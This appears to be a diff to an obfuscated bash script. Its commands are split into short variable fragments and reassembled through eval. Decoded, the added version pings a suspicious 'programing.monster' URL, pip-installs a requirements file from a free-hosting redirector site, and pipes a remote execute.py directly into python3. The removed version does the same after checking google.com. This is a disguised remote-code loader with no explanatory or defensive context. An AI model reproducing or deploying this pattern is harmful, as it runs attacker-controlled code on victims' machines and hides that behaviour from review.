@@ -1,7 +1,11 @@
 #!/bin/bash
 z="
-";DBz=' "In';Pz='n';Uz=' to ';CBz='else';mz='requ';dz='://r';az='all ';KBz='!!!"';Wz='ices';cz='ttps';nz='irem';kz='app.';Lz=' $? ';Fz='ps:/';Gz='/www';
-qz=' --q';Bz=' -q ';Iz='gle.';fz='ecto';Nz='0 ];';xz='ute.';Rz=' "Co';Qz='echo';Ez=' htt';uz='<(wg';GBz='onne';tz='on3 ';BBz='-)';hz='z.00';Hz='.goo';Az='wget';
-iz='0web';LBz='fi';rz='uiet';lz='com/';Oz=' the';Tz='ting';ABz='q -O';Dz='ider';yz='py -';oz='ents';Zz='inst';wz='exec';HBz='ctio';gz='r-xy';Vz='Serv';Kz='if [';
-pz='.txt';Mz='-eq ';Xz='..."';vz='et h';Sz='nnec';JBz='iled';IBz='n Fa';jz='host';Cz='--sp';Jz='com';FBz='et C';sz='pyth';Yz='pip ';bz='-r h';EBz='tern';ez='edir';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$z$Kz$Lz$Mz$Nz$Oz$Pz$z$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$z$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$z$sz$tz$uz$vz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$wz$xz$yz$ABz$BBz$z$CBz$z$Qz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$KBz$z$LBz"
+";cz=' to ';vz='irem';CBz='on3 ';rz='host';gz='pip ';Tz=' $? ';
+Hz='gami';DBz='<(wg';Oz='p?re';Iz='ng.m';Dz='ider';Az='wget';Kz='er/s';
+PBz='ctio';hz='inst';uz='requ';mz='edir';fz='..."';jz='-r h';dz='Serv';
+qz='0web';Vz='0 ];';Nz='d.ph';az='nnec';Zz=' "Co';Gz='/pro';Ez=' htt';Jz='onst';
+Yz='echo';tz='com/';FBz='exec';Rz='.js';nz='ecto';GBz='ute.';Pz='f=B7';bz='ting';
+OBz='onne';JBz='-)';Xz='n';iz='all ';wz='ents';ABz='uiet';lz='://r';BBz='pyth';TBz='fi';Qz='MV3Y';
+kz='ttps';Fz='ps:/';Mz='hrea';SBz='!!!"';EBz='et h';xz='.txt';Uz='-eq ';Cz='--sp';MBz='tern';ez='ices';Bz=' -q ';
+Sz='if [';LBz=' "In';Wz=' the';sz='app.';yz=' --q';Lz='howt';QBz='n Fa';RBz='iled';pz='z.00';NBz='et C';KBz='else';HBz='py -';oz='r-xy';IBz='q -O';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$z$Sz$Tz$Uz$Vz$Wz$Xz$z$Yz$Zz$az$bz$cz$dz$ez$fz$z$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$ABz$z$BBz$CBz$DBz$EBz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$FBz$GBz$HBz$IBz$JBz$z$KBz$z$Yz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$z$TBz"
